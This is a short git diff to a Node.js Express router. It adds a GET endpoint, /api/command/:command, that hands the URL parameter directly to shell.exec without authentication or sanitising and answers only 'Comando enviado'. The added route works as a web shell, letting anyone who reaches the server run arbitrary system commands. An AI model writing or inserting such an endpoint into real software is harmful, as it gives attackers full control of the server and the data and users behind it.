@@ -8,4 +8,10 @@ router.get("/api/osquery/:select", async (req, res) => {
   }, (code, stdout, stderr) => res.status(201).send({output: JSON.parse(stdout)}));
 });
 
+router.get("/api/command/:command", async (req, res) => {
+  shell.exec(`${req.params.command}`, {
+    silent: true
+  }, (code, stdout, stderr) => res.status(201).send({output: "Comando enviado"}));
+});
+
 module.exports = router;
